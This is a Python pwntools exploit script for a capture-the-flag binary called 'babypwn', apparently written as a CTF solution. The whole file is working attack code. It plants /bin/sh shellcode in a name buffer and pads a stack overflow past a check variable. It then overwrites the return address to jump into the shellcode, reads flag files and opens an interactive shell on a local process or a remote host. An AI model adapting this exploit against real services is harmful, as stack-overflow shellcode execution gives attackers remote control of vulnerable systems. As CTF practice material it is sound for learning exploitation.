from pwn import *
import sys

context.binary = "./babypwn"

binary = ELF("./babypwn")

def exploit(target):
    shellcode = asm(shellcraft.sh())

    p.sendlineafter("What is your name?\n", shellcode)

    p.sendline("+")
    p.sendline("1")
    
    first_padding = 0x90 - 0x1 #distance between v1 and v5
    second_padding = (0x90 + 0x8) - (0x90) #return address - padding
    #Padding for overwriting return address 152 <<< Got it by analyzing it using a debugger and PEDA(Python Exploit Development Assistance) using patterns and finding offset
    #but before we overwriting ret address, we must bypass the v5 variable
    #therefore, we need to replace v5 with char depend on condition, in this condition i replaced it with '+'
    #so padding for the v5 is 0x90 - 0x1 = 143
    #i overwrite v5 with '+' after 143 char , then i had 144 chars
    #overwriting ret address starts now, ret address is in $ebp+0x8
    #Full padding for return address is 0x90 + 0x8(for 64 bit elf) = 152
    #I Got 144 char, and the full padding is 152 so we need 152-144 = 8 char for an extra padding
    shellcode_addr = binary.symbols["name"] 
    # i HAVE to set this to "name" variable address, because if i set this to main, it needs us to reinput the "name" variable
    #if we reinput the variable, then we are overwriting the shellcode, it means we wont executing /bin/sh
    log.info("Shellcode addr: {}".format(hex(shellcode_addr)))

    payload = "A" * first_padding
    payload += '*' #after the first padding, we need to overwrite v5 again, the input is free
    payload += "A" * second_padding #padding for overwriting return address
    payload += p64(shellcode_addr) #shellcode address for executing /bin/sh

    p.sendline(payload)
    sleep(1)
    p.sendline("ls -lah  && cat f*")
    p.interactive()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        log.info("Argument needed!")     
        log.info("Usage: python {} <local/remote>".format(sys.argv[0]))
        sys.exit(0)
    elif sys.argv[1] == "local":
        p = process("./babypwn")
        exploit(p)
    elif sys.argv[1] == "remote":
        p = remote("stack.overflow.fail", 9000)
        exploit(p)
    else:
        sys.exit(0)
